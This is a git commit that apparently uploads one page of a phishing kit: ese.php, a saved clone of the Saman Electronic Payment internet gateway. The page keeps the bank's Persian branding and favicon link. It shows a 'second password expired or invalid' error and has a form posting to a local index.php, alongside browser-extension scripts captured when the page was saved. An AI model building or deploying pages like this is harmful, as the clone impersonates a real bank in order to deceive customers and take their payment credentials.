313b2e09107fe4a98dfb7d07c8af672d2eeb0e74
ice.script <60047607+SDARIUSH72@users.noreply.github.com>
2020-06-09 21:58:42 +0430

    Add files via upload

---
+++ ese.php
@@ -0,0 +1,96 @@
+<!DOCTYPE html>
+<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><title>
+	درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
+</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="ese_files/modernizr"></script>
+
+    <script src="ese_files/persian.js"></script>
+<script src="ese_files/Payment.js"></script>
+    <link href="ese_files/css.css" rel="stylesheet">
+<link href="https://sep.shaparak.ir/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <script src="ese_files/jquery-3.js"></script>
+    <script src="ese_files/jquery_003.js"></script>
+    <script src="ese_files/jquery.js"></script>
+    <script src="ese_files/jquery_002.js"></script>
+    <script src="ese_files/bootstrap.js"></script>
+   
+</head><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",e=>{const t=e.data,n=!(t.destination&&t.destination===this.name),s=!t.event;if(!n&&!s)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}})}emitToServer(e,t){const n=this.generateUIID(),s={args:t,destination:this.destination,event:e,id:n};return window.postMessage(s,location.origin),n}emitToBg(e,t){const n=this.generateUIID(),s={bgEventName:e,requestId:n,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",s),n}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,n=navigator.geolocation.watchPosition,o=navigator.geolocation.clearWatch,r=this;navigator.geolocation.getCurrentPosition=function(t,n,o){r.handle(e,"GET",t,n,o)},navigator.geolocation.watchPosition=function(t,e,o){return r.handle(n,"WATCH",t,e,o)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=r.watchIDs[t];return delete r.watchIDs[t],o.apply(this,[e])}}handle(t,e,n,o,r){const i=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let a=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(i,i=>{if(i.enabled)if("SUCCESS"===i.status){const t=this.map(i);n(t)}else{const t=this.errorObj();o(t),a=-1}else{const i=[n,o,r],c=t.apply(navigator.geolocation,i);"WATCH"===e&&(this.watchIDs[a]=c)}}),"WATCH"===e)return a}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+  </script>
+<body id="Body" class="pagebody"> 
+
+    <form method="post" action="index.php" id="frmMain" autocomplete="off">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTIyOTk0NzExOQ9kFgJmD2QWAgIDD2QWAgIBD2QWAgIBD2QWBAIBDw8WAh4EVGV4dAU12LTZhdin2LHZhyDZvtiw24zYsdmG2K/ZhyDYp9is2KjYp9ix24wg2YXbjCDYqNin2LTYryBkZAIDDw8WAh8ABQzYqNin2LLar9i02KpkZGRIEBVWFhnCy7drF0QbWxNeWumGKZR9aAfiyj9uc8AlIQ==">
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BECD23AF">
+</div>
+        <input type="hidden" name="ctl00$sessionKey" id="sessionKey">
+        <div id="wrapAll">
+            <div id="wrapheader">
+                <div class=" top-nav">
+                    <div class="container-fluid box-center">
+                        <div class="contact">021-84080</div>
+                    </div>
+                </div>
+                <div class="inner container-fluid box-center">
+                    <div class="menu-container">
+                        <div class=" box-center">
+                            <div class="pull-left logo"></div>
+                            <div class="pull-right logo-shaparak">
+                            </div>
+                            <div class="title">
+                                <div class="title-text">
+                                    درگاه پرداخت اینترنتی پرداخت الکترونیک سامان
+                                </div>
+                            </div>
+                            <div class="clear"></div>
+                        </div>
+                
+                    </div>
+                </div>
+            </div>
+            <div id="wrapsite">
+                <div id="wrapcenter">
+                    <div class="container-fluid box-center">
+
+                                                
+   <div class="alert alert-danger" id="MessageBox">
+  <strong>خطا!</strong>    <span id="mainContent_Label1" style="font-weight: bold;font-size:14px; ">رمز دوم منقضی یا نامعتبر میباشد <pan>
+</div>
+        <div class="pull-left">
+
+        <input type="submit" name="ctl00$mainContent$btnCancel" value="بازگشت" id="mainContent_btnCancel" class="submit_btn btn-primary btn">
+    </div>
+
+                    </div>
+                    <div class="clear"></div>
+                </div>
+                <div class="divWaiting" style="display: none" id="loading">
+                    <span id="lblWait"></span>
+                </div>
+            </div>
+            <div id="wrapBottom" style="margin-top:419px">
+                <div class="pull-right text-right">
+                    تمامی حقوق این نرم افزار متعلق به شرکت پرداخت الکترونیک سامان می باشد.
+                </div>
+                <div class="pull-left text-left">
+                    شرکت پرداخت الکترونیک سامان <span style="direction: rtl;">2008 - 2020</span>
+                </div>
+                <div class="clear"></div>
+            </div>
+            <div class="clear"></div>
+        </div>
+    </form>
+
+
+
+
+<div class="keypad-popup" style="display: none;"></div></body><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",e=>{const t=e.data,n=!(t.destination&&t.destination===this.name),s=!t.event;if(!n&&!s)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}})}emitToServer(e,t){const n=this.generateUIID(),s={args:t,destination:this.destination,event:e,id:n};return window.postMessage(s,location.origin),n}emitToBg(e,t){const n=this.generateUIID(),s={bgEventName:e,requestId:n,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",s),n}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+    new (class{constructor(e){this.client=window[Symbol.for(e)],this.bindEvents()}bindEvents(){const e=this;var t;history.pushState=(t=history.pushState,function(){const n=t.apply(this,arguments);return e.onUrlChange(),n});let n=!0;history.replaceState=(t=>function(s){var r=t.apply(this,arguments);return n||e.onUrlChange(),n=!1,r})(history.replaceState),window.addEventListener("hashchange",(function(){e.onUrlChange()}))}onUrlChange(){this.client.emitToBg("URLS_SAFE_CHECK__CONTENT_URL_REWRITED")}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+</script></html>
